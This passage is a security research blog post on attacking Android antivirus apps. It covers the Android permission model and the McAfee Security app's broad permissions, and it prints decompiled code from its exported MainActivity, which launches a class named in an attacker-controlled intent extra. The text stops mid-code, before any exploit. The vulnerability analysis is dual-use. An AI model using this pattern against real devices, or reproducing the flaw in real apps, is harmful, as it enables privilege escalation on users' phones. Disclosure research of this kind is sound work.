<!DOCTYPE html>
<html lang="en-US">

<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="chrome=1">
<meta name="HandheldFriendly" content="True">
<meta name="MobileOptimized" content="320">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="referrer" content="no-referrer">
<meta name="author" content="Dylan Iffrig">
<meta name="description" content="Although the usefulness of security tools such as Antivirus, VPN and EDR is now indisputable in business circles, these solutions often need a lot of privileges and permissions to work properly, also making them an excellent target for an attacker. The presence of a bug in one of these types of solutions could allow a malware to elevate its privileges and cause more damage to the organization.
Introduction
Recent research at SCRT has been greatly motivated by the paradoxical idea of attacking security solutions. Could these solutions that are supposed to protect the system and block attackers be abused by an attacker to gain even more privileges on the system ?">

<meta property="og:url" content="https://2dai.github.io/blog/en-attacking-android-antivirus-applications/">
  <meta property="og:site_name" content="Dylan Iffrig">
  <meta property="og:title" content="[EN] - Attacking Android Antivirus Applications">
  <meta property="og:description" content="Although the usefulness of security tools such as Antivirus, VPN and EDR is now indisputable in business circles, these solutions often need a lot of privileges and permissions to work properly, also making them an excellent target for an attacker. The presence of a bug in one of these types of solutions could allow a malware to elevate its privileges and cause more damage to the organization.
Introduction Recent research at SCRT has been greatly motivated by the paradoxical idea of attacking security solutions. Could these solutions that are supposed to protect the system and block attackers be abused by an attacker to gain even more privileges on the system ?">
  <meta property="og:locale" content="en_US">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">
    <meta property="article:published_time" content="2023-03-29T04:07:25-06:00">
    <meta property="article:modified_time" content="2023-03-29T04:07:25-06:00">


<title>


     [EN] - Attacking Android Antivirus Applications 

</title>
<link rel="canonical" href="https://2dai.github.io/blog/en-attacking-android-antivirus-applications/">







<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/styles/default.min.css">




<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Ubuntu+Mono:400,400i,700,700i|Raleway:500">



    <link rel="stylesheet" href="https://2dai.github.io/css/reset.css">
    <link rel="stylesheet" href="https://2dai.github.io/css/pygments.css">
    <link rel="stylesheet" href="https://2dai.github.io/css/main.css">
    
        <link rel="stylesheet" href="https://2dai.github.io/css/override.css">
    




<link rel="shortcut icon"

    href="https://2dai.github.io/img/faceicon.png"

>








</head>


<body lang="fr">

<section class="header">
    <div class="container">
        <div class="content">
            
                
                
                
                
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                
                <a href="https://2dai.github.io/"><img class="avatar" src="https://2dai.github.io/img/logo.png" srcset="https://2dai.github.io/img/logo.png 1x"></a>
            
	    <div class="navig-blog">
		    <a href="https://2dai.github.io/"><div class="name">Dylan Iffrig</div></a>
		    
		    <nav>
			<ul>
			    
				<li class="nav-blog"><a href="https://2dai.github.io/blog/"><span>Blog</span></a></li>
			    
				<li class="nav-about"><a href="https://2dai.github.io/about/"><span>About</span></a></li>
			    
				<li class="nav-projects"><a href="https://2dai.github.io/projects/"><span>Projects</span></a></li>
			    
			</ul>
		    </nav>
	    </div>
        </div>
    </div>
</section>

<section class="icons">
    <div class="container">
        <div class="content">
        
            <a href="//github.com/2dai" target="_blank" rel="noopener"><img class="icon" src="https://2dai.github.io/img/github.svg" alt="github" /></a>
        

        

        
            <a href="//twitter.com/mabenz68" target="_blank" rel="noopener"><img class="icon" src="https://2dai.github.io/img/twitter.svg" alt="twitter" /></a>
        

	

        

        

        
            <a href="//linkedin.com/in/dylan-iffrig" target="_blank" rel="noopener"><img class="icon" src="https://2dai.github.io/img/linkedin.svg" alt="linkedin" /></a>
        

        

        

        

        

        

        

        

        
        </div>
    </div>
</section>


<section class="main post non-narrow zero-top-spacing">
    <div class="container">
        <div class="content">
            <div class="front-matter">
                <div class="title-container">
                    <div class="page-heading">

    [EN] - Attacking Android Antivirus Applications

</div>

                    <div class="initials"><a href="https://2dai.github.io/"></a></div>
                </div>
                <div class="meta">
                    
                    <div class="date" title='Wed Mar 29 2023 04:07:25 -0600'>Mar 29, 2023</div>
                    
                    
		    <div class="reading-time"><div class="middot"></div>8 minutes de lecture</div>
                    
                </div>
            </div>
            <div class="markdown">
                <p>Although the usefulness of security tools such as Antivirus, VPN and EDR is now indisputable in business circles, these solutions often need a lot of privileges and permissions to work properly, also making them an excellent target for an attacker. The presence of a bug in one of these types of solutions could allow a malware to elevate its privileges and cause more damage to the organization.</p>
<h2 id="introduction">Introduction</h2>
<p>Recent research at SCRT has been greatly motivated by the paradoxical idea of attacking security solutions. Could these solutions that are supposed to protect the system and block attackers be abused by an attacker to gain even more privileges on the system ?</p>
<p>While doing some research on the subject, I discovered the awesome work already initiated by several security researchers in 2020. We can cite for example the blog posts from  <a href="https://www.cyberark.com/resources/threat-research-blog/anti-virus-vulnerabilities-who-s-guarding-the-watch-tower">CyberAks Lab</a> on common security bugs in Desktop Antivirus products or also the <a href="https://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html">Orange Tsai</a> research on SSL VPN providers. Among the various articles, I did not find any mention about mobile antivirus applications. Are they more secure ? Or does no one care about them ?</p>
<h2 id="mobile-threat">Mobile threat</h2>
<p>Over the last decade, smartphone usage has grown exponentially whether for personal or professional use. Due to this increasing need for mobility and ease of use, we are seeing more and more applications and activities related to work on an employee&rsquo;s personal devices (Mail,VPN,Contacts,Documents..).
Malicious actors have understood this and we are also seeing an increased volume of malware distribution on mobile platforms compared to previous years.</p>
<p>Security companies have also taken the turn and have started to develop mobile anti-malware protection solutions which surprisingly seem to be used quite a lot.</p>
<p>Here are some of the most downloaded Antivirus Mobile apps on Android:</p>
<ul>
<li>Avast Antivirus &amp; Security (100M+ Downloads)</li>
<li>AVG AntiVirus &amp; Security (100M+ Downloads)</li>
<li>Mobile Antivirus: Norton 360 (50M+ Downloads)</li>
<li>McAfee Security: Antivirus VPN (50M+ Downloads)</li>
<li>Kaspersky Security &amp; VPN (50M+ Downloads)</li>
</ul>
<h2 id="android-application-security-model">Android Application Security Model</h2>
<p>The Android operating system (OS) is based on a modified version of the Linux Kernel. The whole system is designed with a defense in depth approach from the lowest layers with hardware-assisted encryption and key handling to the highest application security layers with Sandboxing or Storage Access.</p>
<p>This section will mainly focus on the OS and application security measures, further information about other security features can be found directly in the <a href="https://source.android.com/static/docs/security/overview/reports/">Android Security Paper</a>.</p>
<p>All Android applications are executed in an application sandbox. The OS takes advantage of the SELinux protection to maintain isolation between the application resources (Data and Code execution). Each application runs in its own process and is assigned with a unique user ID (UID). The applications are therefore not allowed to access other apps files and resources as on Linux each user is isolated from each other.</p>
<p><strong>Storage:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ls -la /data/data/
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">drwx------   <span class="m">8</span> u0_a118        u0_a118        4.0K com.google.android.youtube
</span></span><span class="line"><span class="cl">drwx------  <span class="m">12</span> u0_a183        u0_a183        4.0K com.wsandroid.suite
</span></span><span class="line"><span class="cl">drwx------   <span class="m">9</span> u0_a132        u0_a132        4.0K com.google.android.videos
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div><p><strong>Execution:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ps -ef
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">u0_a146       <span class="m">20160</span>    <span class="m">292</span> <span class="m">0</span> 15:44 ?   com.google.android.permissioncontroller
</span></span><span class="line"><span class="cl">u0_a107       <span class="m">20890</span>    <span class="m">292</span> <span class="m">0</span> 16:31 ?   com.android.vending:background
</span></span><span class="line"><span class="cl">u0_a183       <span class="m">21323</span>    <span class="m">292</span> <span class="m">6</span> 20:46 ?   com.wsandroid.suite
</span></span><span class="line"><span class="cl">u0_a126       <span class="m">17387</span>    <span class="m">292</span> <span class="m">0</span> 36:11 ?   com.google.android.calendar
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div><p align="center">
  <img src="https://2dai.github.io/img/blog-attacking-antivirus-1/app-sandbox.png" />
  <caption>Fig.1 Android Application Sandbox</caption>
</p>
<p>On Android, every access is denied by default (Access to external storage, Telephony Stack..). When an application needs a special access, it must ask for the permission. We can distinguish 2 types of permissions: Linux Permissions and other Android Framework Permissions.</p>
<p>Linux permissions are defined and managed by the Linux kernel through Group IDs. For example, when an application uses the camera; an android.permission.CAMERA permission is requested to the OS. The OS grants the permission by adding the application UID into the correct Linux group. Linux permissions and associated GIDs can be found in the <a href="https://android.googlesource.com/platform/frameworks/base/+/master/data/etc/platform.xml">platform.xml file</a>. These permissions are defined and fixed when the application is installed.
However, if we look at the permission documentation we can see a lot of other permissions that are not present and mapped to a special GID.</p>
<p>Other Android permissions are directly checked at the runtime during Inter Process Communication events (IPC) by the requested services with Android API primitives like checkCallingPermission or enforceCallingPermission.
The Inter Process Communication mechanisms are used to allow the apps to offer some services or features to other processes/applications. Each app should explicitly define what features they want to expose to other apps. In general, developers tend to use high-level IPC abstractions such as Intents, Content Providers, Messengers..</p>
<p>Finally, from an attacker point of view, all of these IPC mechanisms are interesting targets as they offer the possibility to interact with higher privileged processes/applications.</p>
<p>Most of this information about Application Components, Permissions and exported features are defined in the AndroidManifest.xml file of each application. This file describes all essential information about an android application.</p>
<h2 id="mcafee-security-antivirus-vpn-android-application">&lsquo;McAfee Security: Antivirus VPN&rsquo; Android Application</h2>
<p>Knowing about Android&rsquo;s security model, I quickly wondered what these antivirus apps really do and if they do it correctly. This research started in June 2021. At the same period, some of my colleagues at SCRT were already doing security research on other McAfee products. This partly guided my choice and defined my first target: The &lsquo;McAfee Security: Antivirus VPN â€“ 5.12.0.131&rsquo; application which was the lastest release at the time.</p>
<p>Looking at the McAfee AndroidManifest.xml it is possible to quickly get an overview of the current attack surface and app privileges (though the requested permissions).</p>
<h3 id="app-privileges">App Privileges</h3>
<p>By analyzing the permissions, we quickly realize that the application requires a lot of permissions on the system, which makes it an even more interesting target for a malicious application. In total more than 70+ different permissions were defined including permissions deemed as dangerous.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.MODIFY_PHONE_STATE&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.READ_LOGS&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.ACCESS_NETWORK_STATE&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.ACCESS_FINE_LOCATION&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.ACCESS_BACKGROUND_LOCATION&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.RECEIVE_BOOT_COMPLETED&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.READ_CONTACTS&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.WRITE_CONTACTS&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.READ_PHONE_STATE&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.INTERNET&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.VIBRATE&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.ACCESS_COARSE_LOCATION&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.DISABLE_KEYGUARD&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.WRITE_EXTERNAL_STORAGE&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.GET_ACCOUNTS&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.WRITE_SYNC_SETTINGS&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.WRITE_SECURE_SETTINGS&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.WRITE_SETTINGS&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.GET_TASKS&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.REAL_GET_TASKS&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">&#34;android.permission.CALL_PHONE&#34;</span><span class="nt">/&gt;</span>
</span></span></code></pre></div><h3 id="main-activity-vulnerability">Main Activity Vulnerability</h3>
<p>To get an overview of the attack surface, it is interesting to look at all components that allow IPC with other applications without any special permission (or with a misconfigured permission).</p>
<p>By default, any external application installed on the system can directly interact with a component of another app if this component:</p>
<ul>
<li>is defined with the attribute exported=true</li>
<li>is defined with an intent-filter in the component.</li>
</ul>
<p>Actually, prior to Android 12, all components (activities, services, and broadcast receivers) with a declared intent-filter were automatically exported by default. In Android &gt;= 12, all components must explicitly be declared with the android:exported attribute.</p>
<p>The AndroidManifest.xml of the Mcafee application reveals that several components can be called by external apps.</p>
<p>As an example the com.mcafee.activity.MainActivity component is exported:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;activity</span> <span class="na">android:theme=</span><span class="s">&#34;@style/MTheme.Light.NoTitleBar.NoPreview&#34;</span> <span class="na">android:label=</span><span class="s">&#34;@string/app_short_name&#34;</span> <span class="na">android:name=</span><span class="s">&#34;com.mcafee.activity.MainActivity&#34;</span> <span class="na">android:excludeFromRecents=</span><span class="s">&#34;true&#34;</span> <span class="na">android:launchMode=</span><span class="s">&#34;singleTask&#34;</span> <span class="na">android:configChanges=</span><span class="s">&#34;keyboard|keyboardHidden|navigation|orientation|screenLayout|screenSize&#34;</span> <span class="na">android:windowSoftInputMode=</span><span class="s">&#34;adjustUnspecified|stateUnchanged|stateHidden|stateAlwaysHidden|adjustPan&#34;</span> <span class="na">android:hardwareAccelerated=</span><span class="s">&#34;true&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;intent-filter&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">&#34;mcafee.intent.action.mainscreen&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.category.DEFAULT&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/intent-filter&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;intent-filter</span> <span class="na">android:autoVerify=</span><span class="s">&#34;true&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.action.VIEW&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.category.DEFAULT&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">&#34;android.intent.category.BROWSABLE&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;data</span> <span class="na">android:scheme=</span><span class="s">&#34;https&#34;</span> <span class="na">android:host=</span><span class="s">&#34;home.mcafee.com&#34;</span> <span class="na">android:pathPattern=</span><span class="s">&#34;/mobile/campaign.aspx&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;data</span> <span class="na">android:scheme=</span><span class="s">&#34;https&#34;</span> <span class="na">android:host=</span><span class="s">&#34;home.mcafee.com&#34;</span> <span class="na">android:pathPattern=</span><span class="s">&#34;/root/campaign.aspx&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/intent-filter&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/activity&gt;</span>
</span></span></code></pre></div><p>This component is an activity which is started following the standard <a href="https://developer.android.com/guide/components/activities/activity-lifecycle">activity lifecycle</a>. As a result, one of the first methods which is called is onCreate().</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">onCreate</span><span class="p">(</span><span class="n">Bundle</span><span class="w"> </span><span class="n">bundle</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ViewStub</span><span class="w"> </span><span class="n">viewStub</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">super</span><span class="p">.</span><span class="na">onCreate</span><span class="p">(</span><span class="n">bundle</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">u</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">AppsFlyerLib</span><span class="p">.</span><span class="na">getInstance</span><span class="p">().</span><span class="na">registerConversionListener</span><span class="p">(</span><span class="n">getApplicationContext</span><span class="p">(),</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">w</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">viewStub</span><span class="p">.</span><span class="na">inflate</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">new</span><span class="w"> </span><span class="n">ActivityStackDelegate</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="na">finishActivities</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ActivitySelectors</span><span class="p">.</span><span class="na">Others</span><span class="p">(</span><span class="k">this</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">C</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>This onCreate() method in turn calls the method u().</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">u</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Intent</span><span class="w"> </span><span class="n">intent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getIntent</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">stringExtra</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">intent</span><span class="p">.</span><span class="na">getStringExtra</span><span class="p">(</span><span class="n">TRIGGER</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">stringExtra</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">stringExtra</span><span class="p">.</span><span class="na">equalsIgnoreCase</span><span class="p">(</span><span class="s">&#34;MESSAGING&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Intent</span><span class="w"> </span><span class="n">intent2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">intent</span><span class="p">.</span><span class="na">hasExtra</span><span class="p">(</span><span class="s">&#34;ACTION&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="p">...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">intent</span><span class="p">.</span><span class="na">hasExtra</span><span class="p">(</span><span class="s">&#34;SCREEN&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">StringTokenizer</span><span class="w"> </span><span class="n">stringTokenizer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">StringTokenizer</span><span class="p">(</span><span class="n">intent</span><span class="p">.</span><span class="na">getStringExtra</span><span class="p">(</span><span class="s">&#34;SCREEN&#34;</span><span class="p">),</span><span class="w"> </span><span class="n">MoEConstants</span><span class="p">.</span><span class="na">EVENT_SEPARATOR</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ArrayList</span><span class="w"> </span><span class="n">arrayList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">str2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">str</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">stringTokenizer</span><span class="p">.</span><span class="na">hasMoreElements</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">str2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">stringTokenizer</span><span class="p">.</span><span class="na">nextElement</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">arrayList</span><span class="p">.</span><span class="na">add</span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">stringTokenizer</span><span class="p">.</span><span class="na">nextElement</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">i</span><span class="o">++</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">intent2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Intent</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="n">str2</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">unused</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">arrayList</span><span class="p">.</span><span class="na">size</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">Iterator</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">arrayList</span><span class="p">.</span><span class="na">iterator</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">it</span><span class="p">.</span><span class="na">hasNext</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">split</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">it</span><span class="p">.</span><span class="na">next</span><span class="p">()).</span><span class="na">split</span><span class="p">(</span><span class="s">&#34;=&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">intent2</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">intent2</span><span class="p">.</span><span class="na">putExtra</span><span class="p">(</span><span class="n">split</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">split</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">intent2</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Bundle</span><span class="w"> </span><span class="n">extras</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">intent</span><span class="p">.</span><span class="na">getExtras</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">extras</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">intent2</span><span class="p">.</span><span class="na">putExtras</span><span class="p">(</span><span class="n">extras</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">...</span><span class="w">
